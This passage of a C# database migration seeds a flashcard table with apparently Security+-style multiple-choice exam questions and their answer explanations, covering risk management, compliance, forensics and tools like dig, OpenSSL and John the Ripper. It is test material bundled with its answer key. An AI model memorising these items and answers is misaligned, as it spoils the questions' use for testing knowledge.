                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 874, "\r\n99. C. Nondisclosure agreements (NDAs) are signed by an\r\nemployee at the time of hiring, and they impose a contractual\r\nobligation on employees to maintain the confidentiality of\r\ninformation. Disclosure of information can lead to legal\r\nramifications and penalties. NDAs cannot ensure a decrease in\r\nsecurity breaches. A job rotation policy is the practice of moving\r\nemployees between different tasks to promote experience and\r\nvariety. Separation of ties has more than one person required to\r\ncomplete a task. Mandatory vacation policy is used by\r\ncompanies to detect fraud by having a second person, familiar\r\nwith the duties, help discover any illicit activities.\r\n", 5, "\r\n99. Which of the following does not minimize security breaches committed by internal\r\nemployees?\r\nA. Job rotation\r\nB. Separation of duties\r\nC. Nondisclosure agreements signed by employees\r\nD. Mandatory vacations\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 873, "\r\n98. C. State laws often include breach notification thresholds and\r\nrequirements that organizations must follow. Laura should\r\nensure that she is both aware of the breach laws for her state and\r\nany other states or countries her company operates in, and that\r\nher incident response plans have appropriate processes in place\r\nif a breach occurs. Organizations that process data like SSNs are\r\nunlikely to delete them even if a breach occurs, reclassifying data\r\nwould not help unless the data was improperly classified before\r\nthe breach, and data minimization plans are used to limit how\r\nmuch data an organization has, not to respond to a breach\r\ndirectly.\r\n", 5, "\r\n98. Laura is aware that her state has laws that guide her organization in the event of a breach\r\nof personally identifiable information, including Social Security numbers (SSNs). If she has a\r\nbreach that involves SSNs, what action is she likely to have to take based on state law?\r\nA. Destroy all Social Security numbers.\r\nB. Reclassify all impacted data.\r\nC. Provide public notification of the breach.\r\nD. Provide a data minimization plan.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 848, "\r\n73. C. The Federal Trade Commission (FTC) does not provide\r\nsecurity configuration guides or benchmarks for operating\r\nsystems or devices. The Center for Internet Security (CIS),\r\nMicrosoft (and other vendors), and the National Security Agency\r\n(NSA) all provide configuration benchmarks.\r\n", 5, "\r\n73. Amanda administers Windows 10 workstations for her company and wants to use a secure\r\nconfiguration guide from a trusted source. Which of the following is not a common source\r\nfor Windows 10 security benchmarks?\r\nA. CIS\r\nB. Microsoft\r\nC. The FTC\r\nD. The NSA\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 849, "\r\n74. C. Legacy systems that no longer receive support are a\r\nsignificant concern because they cannot be patched if security\r\nvulnerabilities are discovered. Windows 2008 reached its end of\r\nlife in January 2020. It ran on both 32-bit and 64-bit platforms,\r\nand you can still install modern web servers on it.\r\n", 5, "\r\n74. Katie has discovered a Windows 2008 web server running in her environment. What security\r\nconcern should she list for this system?\r\nA. Windows 2008 only runs on 32-bit platforms.\r\nB. Windows 2008 cannot run modern web server software.\r\nC. Windows 2008 has reached its end of life and cannot be patched.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 850, "\r\n75. B. Patching is a form of avoidance because it works to remove a\r\nrisk from the environment. Acceptance of flaws that need\r\npatching would involve leaving the software unpatched;\r\nmitigation strategies might include firewalls, intrusion\r\nprevention systems (IPSs), or web application firewall (WAF)\r\ndevices; and transference options include third-party hosting or\r\nservices.\r\n", 5, "\r\n75. Patching systems immediately after patches are released is an example of what risk\r\nmanagement strategy?\r\nA. Acceptance\r\nB. Avoidance\r\nC. Mitigation\r\nD. Transference\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 851, "\r\n76. B. Risk heat maps or a risk matrix can allow an organization to\r\nquickly look at risks and compare them based on their\r\nprobability and impact or other rating elements. Qualitative and\r\nquantitative risk assessments are types of assessment, not\r\nmeans of presenting risk information in an easy-to-understand\r\nformat, and risk plots are not a common term used in the field.\r\n", 5, "\r\n76. Charles wants to display information from his organization’s risk register in an easy-tounderstand\r\nand -rank format. What common tool is used to help management quickly understand\r\nrelative rankings of risk?\r\nA. Risk plots\r\nB. A heat map\r\nC. A qualitative risk assessment\r\nD. A quantitative risk assessment\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 852, "\r\n77. A. The fines that can result from violation or infringement of\r\nregulations like the General Data Protection Regulation can\r\nhave a significant impact on an organization, or could even\r\npotentially put it out of business. Due to this, organizations will\r\ntrack compliance with regulations as part of their risk posture.\r\n", 5, "\r\n77. What key element of regulations, like the European Union’s (EU’s) GDPR, drive organizations\r\nto include them in their overall assessment of risk posture?\r\nA. Potential fines\r\nB. Their annual loss expectancy (ALE)\r\nC. Their recovery time objective (RTO)\r\nD. The likelihood of occurrence\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 853, "\r\n78. D. Disaster recovery requires forethought and preparation,\r\nresponse to issues to minimize impact during a disaster, and\r\nresponse activities after a disaster. Thus, a complete disaster\r\nrecovery plan should include actions that may or will occur\r\nbefore, during, and after a disaster, and not just the recovery\r\nprocess after the fact.\r\n", 5, "\r\n78. What phases of handling a disaster are covered by a disaster recovery plan?\r\nA. What to do before the disaster\r\nB. What to do during the disaster\r\nC. What to do after the disaster\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 854, "\r\n79. B. Although data breaches could result in termination of a card\r\nprocessing agreement, the fact that her organization is\r\nnoncompliant is most likely to result in a fine. PCI-DSS, or\r\nPayment Card Industry Data Security Standard, is a vendor\r\nstandard, not a law, and criminal charges would not typically be\r\nfiled in a situation like this.\r\n", 5, "\r\n79. Naomi’s organization has recently experienced a breach of credit card information. After\r\ninvestigation, it is discovered that her organization was inadvertently not fully compliant\r\nwith PCI-DSS and is not currently fully compliant. Which of the following penalties is her\r\norganization most likely to incur?\r\nA. Criminal charges\r\nB. Fines\r\nC. Termination of the credit card processing agreement\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 855, "\r\n80. C. The Cloud Security Alliance’s Cloud Control Matrix maps\r\nexisting standards to common control descriptions allowing\r\ncontrol requirements to be compared and validated across many\r\nstandards and regulations. The CSA reference architecture is a\r\nset of standard designs, and ISO 27001 and ISO 27002 are\r\nstandards for managing information security.\r\n", 5, "\r\n80. Alaina wants to map a common set of controls for cloud services between standards like\r\nCOBIT (Control Objectives for Information and Related Technology), FedRAMP (Federal\r\nRisk and Authorization Management Program), HIPAA (the Health Insurance Portability\r\nand Accountability Act of 1996), and others. What can she use to speed up that process?\r\nA. The CSA’s reference architecture\r\nB. ISO 27001\r\nC. The CSA’s cloud control matrix\r\nD. ISO 27002\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 856, "\r\n81. B. Gamification makes training into a game to get more\r\ninvolvement and interest. Scoring points and receiving rewards,\r\neither in-game or virtually, can have a significant positive\r\nimpact on the response to training. Capture-the-flag events\r\nfocus on techniques like finding hidden information or\r\notherwise obtaining “flags” as part of a contest. Phishing\r\ncampaigns send fake phishing emails to staff to identify\r\nindividuals who may fall for them. Role-based training focuses\r\non training specifically for the role or job that an individual has\r\nor will have.\r\n", 5, "\r\n81. Gary has created an application that new staff in his organization are asked to use as part\r\nof their training. The application shows them examples of phishing emails and asks the staff\r\nmembers to identify the emails that are suspicious and why. Correct answers receive points,\r\nand incorrect answers subtract points. What type of user training technique is this?\r\nA. Capture the flag\r\nB. Gamification\r\nC. Phishing campaigns\r\nD. Role-based training\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 857, "\r\n82. D. The General Data Protection Regulation, or GDPR, requires\r\na data protection officer (DPO). They oversee the organization’s\r\ndata protection strategy and implementation, and make sure\r\nthat the organization complies with the GDPR.\r\n", 5, "\r\n82. What law or regulation requires a DPO in organizations?\r\nA. FISMA\r\nB. COPPA\r\nC. PCI-DSS\r\nD. GDPR\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 858, "\r\n83. D. Although recovering from a breach can be costly, the loss of\r\ndata like intellectual property in circumstances like these is the\r\nmost critical issue. The institution is likely to suffer reputational\r\nharm and may not be trusted to conduct research like this in the\r\nfuture, leading to an even greater cost to the university’s ability\r\nto do new research with the government.\r\n", 5, "\r\n83. The university that Susan works for conducts top secret research for the U.S. Department\r\nof Defense as part of a partnership with its engineering school. A recently discovered breach\r\npoints to the school being compromised for over a year by an advanced persistent threat\r\nactor. What consequence of the breach should Susan be most concerned about?\r\nA. Cost to restore operations\r\nB. Fines\r\nC. Identity theft\r\nD. IP theft\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 859, "\r\n84. B. Mission-essential functions are defined as those functions\r\nthat an organization must run throughout a disaster or that\r\nmust be resumed as quickly as possible after one if they cannot\r\nbe sustained. They are the core functions of the organization and\r\nare key to its success and ongoing existence. A single point of\r\nfailure (SPOF) is a point where a device, system, or resource can\r\nfail and cause an entire function or organization to no longer\r\nwork. Recovery time objectives (RTOs) are the time allotted to\r\nreturn to normal functionality. Core recovery functions were\r\nmade up for this question.\r\n", 5, "\r\n84. What term is used to describe the functions that need to be continued throughout or resumed\r\nas quickly as possible after a disaster?\r\nA. Single points of failure\r\nB. Mission-essential functions\r\nC. Recovery time objectives\r\nD. Core recovery functions\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 860, "\r\n85. B. A SLA (service level agreement) defines the level of service\r\nthe customer expects from the service provider. The level of\r\nservice definitions should be specific and measurable in each\r\narea. An MOU (memorandum of understanding) is a legal\r\ndocument that describes a mutual agreement between parties.\r\nAn ISA (interconnection security agreement) is an agreement\r\nthat specifies the technical and security requirements of the\r\ninterconnection between organizations. A BPA (business\r\npartnership agreement) is a legal agreement between partners.\r\nIt establishes the terms, conditions, and expectations of the\r\nrelationship between the partners.\r\n", 5, "\r\n85. Your company is considering moving its mail server to a hosting company. This will help\r\nreduce hardware and server administrator costs at the local site. Which of the following documents\r\nwould formally state the reliability and recourse if the reliability is not met?\r\nA. MOU\r\nB. SLA\r\nC. ISA\r\nD. BPA\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 861, "\r\n86. A. Customer data can include any information that a customer\r\nuploads, shares, or otherwise places in or creates via a service.\r\nCustomers may have contractual security guarantees in the\r\nterms of service, and notification or other clauses may also\r\nimpact what Rick needs to do if the data is breached. PII is\r\npersonally identifiable information like name, address, or other\r\ndetails that can identify a person. Financial information may\r\ninclude bills, account balances, and similar details. Health\r\ninformation covers a broad range of data about an individual’s\r\nmedical and health status or history.\r\n", 5, "\r\n86. Rick’s organization provides a website that allows users to create an account and then\r\nupload their art to share with other users. He is concerned about a breach and wants to\r\nproperly classify the data for their handling process. What data type is most appropriate for\r\nRick to label the data his organization collects and stores?\r\nA. Customer data\r\nB. PII\r\nC. Financial information\r\nD. Health information\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 862, "\r\n87. C. Theft of proprietary information like a formula or code is an\r\nexample of intellectual property (IP) theft. IP theft can be harder\r\nto quantify the cost of a loss in many cases but can have\r\nsignificant impact to an organization that relies on the IP for\r\ntheir business. External risk is risk created by factors outside the\r\norganization, internal risk is created by the organization itself or\r\nits decisions, and licensing risk exists through software and\r\nother contracts.\r\n", 5, "\r\n87. Jack is conducting a risk assessment, and a staff member notes that the company has specialized,\r\ninternal AI algorithms that are part of the company’s main product. What risk should\r\nJack identify as most likely to impact those algorithms?\r\nA. External\r\nB. Internal\r\nC. IP theft\r\nD. Licensing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 863, "\r\n88. B. This is an example of a personnel credential policy since it\r\napplies to the staff who are employed by his organization.\r\nPolicies like this help to ensure that accounts are not shared or\r\nreused. There is no mention of specific devices, service accounts,\r\nor administrative accounts.\r\n", 5, "\r\n88. Dan has written a policy that prohibits employees from sharing their passwords with their\r\ncoworkers, family members, or others. What type of credential policy has he created?\r\nA. Device credential policy\r\nB. Personnel credential policy\r\nC. A service account policy\r\nD. An administrative account policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 864, "\r\n89. C. The likelihood of occurrence, or probability, is multiplied by\r\nthe impact to determine a risk’s severity.\r\n", 5, "\r\n89. Risk severity is calculated using the equation shown here. What information should be substituted\r\nfor X?\r\nRisk severity = X * Impact\r\nA. Inherent risk\r\nB. MTTR (mean time to repair)\r\nC. Likelihood of occurrence\r\nD. RTO (recovery time objective)\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 865, "\r\n90. D. Organizations can determine how they want to determine\r\nasset value, but consistency is important in many cases. Thus,\r\nthe original cost, the replacement cost, or a depreciated cost may\r\nbe used.\r\n", 5, "\r\n90. How is asset value determined?\r\nA. The original cost of the item\r\nB. The depreciated cost of the item\r\nC. The cost to replace the item\r\nD. Any of the above based on organizational preference\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 866, "\r\n91. A. A business impact analysis (BIA) helps to identify critical\r\nsystems by determining which systems will create the largest\r\nimpact if they are not available. MTBF is the mean time between\r\nfailures, an RTO is a recovery time objective, and an ICD was\r\nmade up for this question.\r\n", 5, "\r\n91. What process is used to help identify critical systems?\r\nA. A BIA\r\nB. An MTBF\r\nC. An RTO\r\nD. An ICD\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 867, "\r\n92. D. The most common means of transferring breach risk is to\r\npurchase cybersecurity insurance. Accepting breaches is rarely\r\nconsidered a valid risk process, blaming breaches on\r\ncompetitors does not actually transfer risk, and selling data to\r\nanother organization is not a risk handling process but may be a\r\nbusiness process.\r\n", 5, "\r\n92. Zarmeena wants to transfer the risk for breaches to another organization. Which of the following\r\noptions should she use to transfer the risk?\r\nA. Explain to her management that breaches will occur.\r\nB. Blame future breaches on competitors.\r\nC. Sell her organization’s data to another organization.\r\nD. Purchase cybersecurity insurance.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 868, "\r\n93. B. Service accounts are not typically allowed to use interactive\r\nlogins, and thus prohibiting interactive logins is a common\r\nsecurity policy for them. Limited login hours or locations are\r\nmore commonly used for employee accounts when they should\r\nnot be accessing resources after hours or from nonwork\r\nlocations. Frequent password expiration for service accounts is\r\nactually likely to cause a service outage, and many service\r\naccounts have complex passwords and are set with longer\r\npassword expiration timeframes or are set to never expire.\r\n", 5, "\r\n93. Which of the following is a common security policy for service accounts?\r\nA. Limiting login hours\r\nB. Prohibiting interactive logins\r\nC. Limiting login locations\r\nD. Implementing frequent password expiration\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 869, "\r\n94. C. The cost of a breach is an example of the impact of a breach.\r\nProbability is how likely the risk is to occur, and risk severity is\r\ncalculated by multiplying probability and impact.\r\n", 5, "\r\n94. The financial cost of a breach is an example of what component of risk calculations?\r\nA. Probability\r\nB. Risk severity\r\nC. Impact\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 870, "\r\n95. B. Sean is conducting a site risk assessment that will help him\r\nunderstand and communicate the risks that the site itself has. If\r\nthe location is in a FEMA-identified flood plain, or if there are\r\nconcerns about tornadoes or other natural disasters, those need\r\nto be taken into account as the organization makes its decisions\r\nabout the location. A BIA identifies mission-critical functions\r\nand the systems that support them. Crime prevention through\r\nenvironmental design is a design concept that uses the design of\r\nfacilities to reduce the likelihood of criminal actions through use\r\nof lighting and other controls. Business continuity planning\r\nfocuses on how to keep an organization operating despite\r\ndisruptions.\r\n", 5, "\r\n95. As part of his organization’s effort to identify a new headquarters location, Sean reviews the\r\nFederal Emergency Management Agency (FEMA) flood maps for the potential location he is\r\nreviewing. What process related to disaster recovery planning includes actions like this?\r\nA. Business impact analysis (BIA)\r\nB. Site risk assessment\r\nC. Crime prevention through environmental design\r\nD. Business continuity planning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 871, "\r\n96. D. SOC 2 engagement assesses the security and privacy\r\ncontrols that are in place, and a Type 2 report provides\r\ninformation on the auditor’s assessment of the effectiveness of\r\nthe controls that are in place. An SOC 1 report assesses the\r\ncontrols that impact the accuracy of financial reporting. Type 1\r\nreports a review auditor’s opinion of the description provided by\r\nmanagement about the suitability of the controls as designed.\r\nThey do not look at the actual operating effectiveness of the\r\ncontrols.\r\n", 5, "\r\n96. Joanna wants to request an audit report from a vendor she is considering and plans to review\r\nthe auditor’s opinions on the effectiveness of the security and privacy controls the vendor has\r\nin place. What type of Standard for Attestation Engagements (SSAE) should she request?\r\nA. SSAE-18 SOC 1, Type 2\r\nB. SSAE-18 SOC 2, Type 1\r\nC. SSAE-18 SOC 1, Type 1\r\nD. SSAE-18 SOC 2, Type 2\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 872, "\r\n97. B. Ensuring that leadership throughout an organization is\r\naware of the risks the organization faces and that they are\r\nregularly updating and providing feedback on those risks helps\r\nincrease risk awareness. Inherent risk is risk that exists before\r\ncontrols are in place, and residual risk is risk that remains after\r\ncontrols are in place. Risk appetite is the risk that an\r\norganization is willing to take as part of doing business.\r\n", 5, "\r\n97. Jason has created a risk register for his organization and regularly updates it with input from\r\nmanagers and senior leadership throughout the organization. What purpose does this serve?\r\nA. It decreases inherent risk.\r\nB. It increases risk awareness.\r\nC. It decreases residual risk.\r\nD. It increases risk appetite.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 791, "\r\n16. A. Risk acceptance is a strategy of recognizing, identifying, and\r\naccepting a risk that is sufficiently unlikely or that has such\r\nlimited impact that a corrective control is not warranted. Risk\r\ntransfer is the act of moving the risk to hosted providers who\r\nassume the responsibility for recovery and restoration or by\r\nacquiring insurance to cover the costs emerging from a risk. Risk\r\navoidance is the removal of the vulnerability that can increase a\r\nparticular risk so that it is avoided altogether. Risk mitigation is\r\nwhen a company implements controls to reduce vulnerabilities\r\nor weaknesses in a system. It can also reduce the impact of a\r\nthreat.\r\n", 5, "\r\n16. You are a security administrator for your company and you identify a security risk. You\r\ndecide to continue with the current security plan. However, you develop a contingency plan\r\nin case the security risk occurs. Which of the following type of risk response technique are\r\nyou demonstrating?\r\nA. Accept\r\nB. Transfer\r\nC. Avoid\r\nD. Mitigate\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 453, "\r\n47. B. Physically portioning your network is the physical equivalent\r\nof a virtual LAN, or VLAN. A VLAN is designed to emulate\r\nphysical partitioning. Perimeter security does not segment the\r\nnetwork. Security zones are useful but don’t, by themselves,\r\nsegment a network. Often a network is segmented, using\r\nphysical partitions or VLAN, to create security zones. A firewall\r\nis meant to block certain traffic, not to segment the network,\r\nalthough a firewall can be part of a segmentation or security\r\nzone implementation.\r\n", 3, "\r\n47. Which of the following is the equivalent of a VLAN from a physical security perspective?\r\nA. Perimeter security\r\nB. Partitioning\r\nC. Security zones\r\nD. Firewall\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 790, "\r\n15. D. Testing and training are preventive administrative controls.\r\nAdministrative controls dictate how security policies should be\r\nexecuted to accomplish the company’s security goals. A detective\r\ntechnical control uncovers a violation through technology. A\r\npreventive technical control attempts to stop a violation through\r\ntechnology. Detective administrative controls uncover a\r\nviolation through policies, procedures, and guidelines.\r\n", 5, "\r\n15. Your company’s security policy includes system testing and security awareness training guidelines.\r\nWhich of the following control types is this?\r\nA. Detective technical control\r\nB. Preventive technical control\r\nC. Detective administrative control\r\nD. Preventive administrative control\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 788, "\r\n13. C. Antivirus is an example of a corrective control. A corrective\r\ncontrol is designed to correct a situation. An IDS (intrusion\r\ndetection system) is a detective control because it detects\r\nsecurity breaches. An audit log is a detective control because it\r\ndetects security breaches. A router is a preventive control\r\nbecause it prevents security breaches with access control lists\r\n(ACLs).\r\n", 5, "\r\n13. During a meeting, you present management with a list of access controls used on your network.\r\nWhich of the following controls is an example of a corrective control?\r\nA. IDS\r\nB. Audit logs\r\nC. Antivirus software\r\nD. Router\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 707, "\r\n75. D. The Security+ exam outline focuses on right to audit clauses,\r\nregulatory and jurisdictional issues, and data breach notification\r\nlaws as key elements to consider when planning on-site versus\r\ncloud forensic differences. Provenance is important regardless of\r\nwhere the forensic activity occurs.\r\n", 4, "\r\n75. Which of the following is not a key consideration when considering on-premises versus cloud\r\nforensic investigations?\r\nA. Data breach notification laws\r\nB. Right-to-audit clauses\r\nC. Regulatory requirements\r\nD. Provenance\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 708, "\r\n76. A. A variety of configuration changes could be pushed to\r\nmobile devices to help: setting passcodes, enabling full-disk\r\nencryption (FDE) on mobile devices via organizationally\r\ndeployed mobile device management (MDM), or even\r\npreventing some sensitive files from being downloaded or kept\r\non those devices could all help. Firewall rules, data loss\r\nprevention (DLP) rules, and URL filters will not prevent a stolen\r\ndevice from being accessed and the data being exposed.\r\n", 4, "\r\n76. The company Charles works for has recently had a stolen company cell phone result in a\r\ndata breach. Charles wants to prevent future incidents of a similar nature. Which of the following\r\nmitigation techniques would be the most effective?\r\nA. Enable FDE via MDM.\r\nB. A firewall change\r\nC. A DLP rule\r\nD. A new URL filter rule\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 709, "\r\n77. B. The @ command for dig selects the Domain Name System\r\n(DNS) server it should query. In this case, it will query one of\r\nGoogle’s DNS servers at 8.8.8.8 for the DNS information for\r\nexample.com.\r\n", 4, "\r\n77. Henry runs the following command:\r\ndig @8.8.8.8 example.com\r\nWhat will it do?\r\nA. Search example.com’s DNS server for the host 8.8.8.8.\r\nB. Search 8.8.8.8’s DNS information for example.com.\r\nC. Look up the hostname for 8.8.8.8.\r\nD. Perform open source intelligence gathering about 8.8.8.8 and example.com.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 710, "\r\n78. C. Greg should use the built-in hashing functions to compare\r\neither an MD5 or SHA-1 hash of the source drive to a hash using\r\nthe same function run on the image. If they match, he has a valid\r\nand intact image. None of the other answers will provide\r\nvalidation that the full drive was properly imaged.\r\n", 4, "\r\n78. Greg is collecting a forensic image of a drive using FTK Imager, and he wants to ensure that\r\nhe has a valid copy. What should he do next?\r\nA. Run the Linux cmp command to compare the two files.\r\nB. Calculate an AES-256 hash of the two drives.\r\nC. Compare an MD5 or SHA-1 hash of the drive to the image.\r\nD. Compare the MD5 of each file on the drive to the MD5 of each file in the image.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 711, "\r\n79. B. The Linux grep command is a search tool that Adam can use\r\nto search through files or directories to find strings. cat is short\r\nfor concatenate, and the command can be used to create files, to\r\nview their contents, or to combine files. head and tail are used\r\nto view the beginning or end of a file, respectively.\r\n", 4, "\r\n79. Adam needs to search for a string in a large text file. Which of the following tools should he\r\nuse to most efficiently find every occurrence of the text he is searching for?\r\nA. cat\r\nB. grep\r\nC. head\r\nD. tail\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 712, "\r\n80. C. Segmentation splits networks or systems into smaller units\r\nthat align with specific needs. Segmentation can be functional,\r\nsecurity based, or for other purposes. Removing potentially\r\ninfected systems would be an example of isolation, using\r\nfirewalls and other tools to stop the spread of an infection is\r\ncontainment, and adding security systems to prevent data loss is\r\nan example of implementing a security tool or feature.\r\n", 4, "\r\n80. Angela wants to use segmentation as part of her mitigation techniques. Which of the\r\nfollowing best describes a segmentation approach to network security?\r\nA. Removing potentially infected or compromised systems from the network\r\nB. Using firewalls and other tools to limit the spread of an active infection\r\nC. Partitioning the network into segments based on user and system roles and security\r\nrequirements\r\nD. Adding security systems or devices to prevent data loss and exposure’\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 713, "\r\n81. B. Unlike a disaster recovery plan that is written to help an\r\norganization recovery from a person-made or natural disaster, a\r\nbusiness continuity plan focuses on how to keep the business\r\nrunning when it is disrupted. Thus, Charlene’s BC plan would\r\ndetail how to keep the organization running when a system\r\noutage occurs.\r\n", 4, "\r\n81. Charlene has been asked to write a business continuity (BC) plan for her organization. Which\r\nof the following will a business continuity plan best handle?\r\nA. How to respond during a person-made disaster\r\nB. How to keep the organization running during a system outage\r\nC. How to respond during a natural disaster\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 714, "\r\n82. C. OpenSSL can be used to generate a certificate using a\r\ncommand like this:\r\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048\r\n-keyout\r\nprivateKey.key -out certificate.crt.\r\nNone of the other tools listed can be used to generate a\r\ncertificate.\r\n", 4, "\r\n82. Brad wants to create a self-signed x.509 certificate. Which of the following tools can be used\r\nto perform this task?\r\nA. hping\r\nB. Apache\r\nC. OpenSSL\r\nD. scp\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 715, "\r\n83. A. The only password cracker listed is John the Ripper. John\r\naccepts custom wordlists, meaning that Cameron can create and\r\nuse his own wordlist, as shown in option A.\r\n", 4, "\r\n83. Cameron wants to test for commonly used passwords in his organization. Which of the following\r\ncommands would be most useful if he knows that his organization’s name, mascot,\r\nand similar terms are often used as passwords?\r\nA. john --wordlist \"mywords.txt\" --passwordfile.txt\r\nB. ssh -test -\"mascotname, orgname\"\r\nC. john -show passwordfile.txt\r\nD. crack -passwords -wordlist \"mascotname, orgname\"\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 716, "\r\n84. A. Autopsy does not have a built-in capability to create disk\r\nimages. Instead, it relies on third-party tools for acquisition and\r\nthen imports disk images and other media. Autopsy has built-in\r\ntimeline generation, image filtering and identification, and\r\ncommunication visualization, among many other capabilities.\r\n", 4, "\r\n84. Which of the following capabilities is not built into Autopsy?\r\nA. Disk imaging\r\nB. Timeline generation\r\nC. Automatic image filtering\r\nD. Communication visualization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 717, "\r\n85. C. Many cloud service providers do not allow customer-driven\r\naudits, either by the customer or a third party. They also\r\ncommonly prohibit vulnerability scans of their production\r\nenvironment to avoid service outages. Instead, many provide\r\nthird-party audit results in the form of a service organization\r\ncontrols (SOC) report or similar audit artifact.\r\n", 4, "\r\n85. Alaina’s company is considering signing a contract with a cloud service provider, and wants\r\nto determine how secure their services are. Which of the following is a method she is likely to\r\nbe able to use to assess it?\r\nA. Ask for permission to vulnerability scan the vendor’s production service.\r\nB. Conduct an audit of the organization.\r\nC. Review an existing SOC audit.\r\nD. Hire a third party to audit the organization.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
